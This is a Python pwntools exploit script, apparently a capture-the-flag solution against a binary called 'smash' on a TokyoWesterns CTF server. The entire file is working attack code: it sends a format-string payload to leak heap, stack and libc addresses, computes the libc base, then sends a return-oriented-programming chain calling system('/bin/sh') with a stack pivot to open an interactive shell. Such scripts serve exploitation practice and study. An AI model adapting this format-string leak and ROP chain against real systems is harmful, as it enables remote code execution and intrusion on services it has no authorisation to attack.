#!/usr/bin/env python3
from pwn import *
_FILE = "./smash"
binary = context.binary = ELF(_FILE, checksec=False)
env = {"LD_PRELOAD": ""} #"./libc-2.31.so"}
offset = 234 # 231 on glibc 2.27
one_gadget = 0xcda5a
if args.GDB:
    p = gdb.debug(_FILE, gdbscript="\nc\n", env=env)
elif args.REMOTE:
    offset = 234
    one_gadget = 0xe6ce3
    p = remote("pwn01.chal.ctf.westerns.tokyo", 29246)
else:
    p = process("./run.sh", env=env)
_LIBC = ELF("./libc-2.31.so", checksec=False) if args.REMOTE else binary.libc
p.recvuntil("Input name > ")
p.sendline("sh -c sh "+"%p"*10)
leaks = p.recvuntil("OK?").decode("latin-1").replace("(nil)", "0x0").split("\n")[0].split("-c sh")[1].split("0x")[:-1][1:]
print(leaks)
main_libc_addr = int(leaks[-1], 16)
main_addr = int(leaks[6], 16)-0xd
_LIBC.address = (main_libc_addr - offset) - _LIBC.sym["__libc_start_main"]
print(leaks[0])
heap_leak = int(leaks[0], 16)
stack_leak = int(leaks[5], 16)
log.info(f"libc addr {hex(_LIBC.address)}")
log.info(f"heap leak {hex(heap_leak)}")
log.info(f"main addr {hex(main_addr)}")
log.info(f"main addr {hex(stack_leak)}")
system = _LIBC.sym["system"]
p.recvuntil("[y/n] ")
p.sendline(b"y")
p.recvuntil("Input message > ")
input("ready?")
binsh = next(_LIBC.search(b"/bin/sh"))
pop_rdi = main_addr + 0x1ca
log.info(f"sending {hex(heap_leak+0x30-40)}")
p.sendline(p64(pop_rdi) + p64(binsh) + p64(_LIBC.sym["system"]) + cyclic(40-16, n=8) + p64(stack_leak-0x68)) # + p64(heap_leak+8)) #(p64(_LIBC.address + (0xe6ce6 if args.REMOTE else 0xcda5d))+ cyclic(40, n=8) + p64(heap_leak+0x30-40) + cyclic(1000, n=8)) #p64(main_addr)*(48//8) + p64(heap_leak+0x30)*100)
p.interactive()